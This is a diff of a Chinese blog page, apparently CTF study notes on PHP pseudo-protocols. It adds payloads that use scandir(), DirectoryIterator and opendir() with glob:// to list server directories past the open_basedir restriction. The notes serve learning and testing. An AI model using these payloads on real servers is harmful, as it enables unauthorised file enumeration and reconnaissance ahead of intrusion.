@@ -196,7 +196,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      4.1k 字
+      4.3k 字
     </span>
   
 
@@ -206,7 +206,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      51
+      54
        分钟
     </span>
   
@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年3月12日 晚上
+                  本文最后更新于：2021年4月6日 晚上
                 
               </p>
             
@@ -463,12 +463,18 @@
 <li><p>PHP版本&gt;=5.3.0</p>
 </li>
 <li><p>运用：（这里是学长教的hh）</p>
-<p><strong>设计缺陷导致的任意文件名列出</strong>：由于PHP在设计的时候（可以通过源码来进行分析），对于glob伪协议的实现过程中不检测open_basedir以及safe_mode也是不会检测的，由此可利用glob://罗列文件名<br>（也就是说在可读权限下，可以得到文件名，但无法读取文件内容；可以在搜索服务器旁站使用~）</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span><br>var_dump(scandir(<span class="hljs-string">&quot;glob:///*&quot;</span>));<br>print_r(scandir(<span class="hljs-string">&quot;glob://./*&quot;</span>));<br><span class="hljs-keyword">echo</span> json_encode(scandir(<span class="hljs-string">&quot;glob://../*&quot;</span>));<br><span class="hljs-comment"># 以下是学长的碎碎念</span><br><span class="hljs-comment"># （关键在于 scandir() + glob伪协议</span><br><span class="hljs-comment"># （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span><br><span class="hljs-comment"># （比如 opendir 吧</span><br></code></pre></td></tr></table></figure>
-
-
+<p><strong>设计缺陷导致的任意文件名列出</strong>：由于PHP在设计的时候（可以通过源码来进行分析），对于glob伪协议的实现过程中不检测open_basedir以及safe_mode也是不会检测的，由此可利用glob://罗列文件名<br>（也就是说在可读权限下，可以得到文件名，但无法读取文件内容；也就是单纯的罗列目录，能用来绕过open_basedir）</p>
 </li>
 </ul>
+<h3 id="scandir-glob"><a href="#scandir-glob" class="headerlink" title="scandir()+glob://"></a>scandir()+glob://</h3><p>  只能列出根目录以及open_basedir()允许目录下的文件</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#以下三种payload，都可以将扫描结果输出，绝对路径|相对路径都可以</span><br>var_dump(scandir(<span class="hljs-string">&quot;glob:///*&quot;</span>));<br>print_r(scandir(<span class="hljs-string">&quot;glob://./*&quot;</span>));<br><span class="hljs-keyword">echo</span> json_encode(scandir(<span class="hljs-string">&quot;glob://../*&quot;</span>));<br><span class="hljs-comment">#  以下是学长的碎碎念</span><br><span class="hljs-comment"># （关键在于 scandir() + glob伪协议</span><br><span class="hljs-comment"># （不过实际上也可以用别的方法来弄，这个涉及到CTF。。一般来说不会这么绝</span><br><span class="hljs-comment"># （比如 opendir 吧</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>var_dump(scandir(<span class="hljs-string">&#x27;glob:///*&#x27;</span>));<br>&gt;<br></code></pre></td></tr></table></figure>
+<h3 id="DirectoryIterator-glob"><a href="#DirectoryIterator-glob" class="headerlink" title="DirectoryIterator+glob://"></a>DirectoryIterator+glob://</h3><p>  DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口，利用此方法可以绕过open_basedir限制。(但是似乎只能用于Linux下)</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">payloadL:<br><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">directoryiterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>); <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;__tostring().<span class="hljs-string">&#x27; &#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#	glob:///*	会列出根目录下的文件</span><br><span class="hljs-comment"># 	glob://*	会列出open_basedir允许目录下的文件</span><br></code></pre></td></tr></table></figure>
+<h3 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h3><p>  同样只能列出根目录已经open_basedir()允许的目录</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-string">&#x27;glob:///*&#x27;</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    closedir(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
 <h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><ul>
 <li><p>phar:// — PHP 归档，将多个文件组合成一个文件</p>
 </li>
